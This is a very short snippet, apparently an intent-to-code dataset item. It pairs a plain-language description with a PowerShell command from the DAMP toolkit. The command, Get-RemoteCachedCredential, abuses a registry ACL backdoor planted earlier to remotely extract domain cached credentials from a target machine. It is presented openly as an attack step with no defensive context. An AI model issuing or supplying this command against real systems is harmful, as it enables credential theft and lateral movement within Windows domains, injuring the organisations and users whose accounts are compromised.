# Natural language intent:
# using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.

Get-RemoteCachedCredential -ComputerName < remotehost> -Verbose
